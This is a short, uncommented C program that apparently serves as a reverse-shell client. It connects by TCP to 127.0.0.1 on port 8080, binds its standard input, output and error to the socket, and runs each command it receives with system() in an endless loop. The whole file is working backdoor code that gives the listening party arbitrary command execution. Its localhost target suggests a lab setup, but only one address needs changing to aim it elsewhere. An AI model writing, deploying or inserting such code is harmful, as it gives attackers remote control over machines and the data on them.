#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>

#define PORT	 8080
#define MAXLINE 1024

int sockfd;

void exec_commmand()
{
    char recv_command[MAXLINE];
    int command_len;
    command_len=read(sockfd,recv_command,MAXLINE);

    if(command_len<=0) return;

	dup2(sockfd,0);
	dup2(sockfd,1);
	dup2(sockfd,2);

	system(recv_command);
    
}

int main() {
	char buffer[MAXLINE];
	struct sockaddr_in	 servaddr;
 
	// Creating socket file descriptor
	if ( (sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0 ) {
		perror("socket creation failed");
		exit(EXIT_FAILURE);
	}
 
	memset(&servaddr, 0, sizeof(servaddr));
 
	// Filling server information
	servaddr.sin_family = AF_INET;
	servaddr.sin_port = htons(PORT);
	servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
 
	int n, len;

    connect(sockfd,(const struct sockaddr*)&servaddr,sizeof(servaddr));

    while(1)
	{
		exec_commmand();
	}


	close(sockfd);
	return 0;
}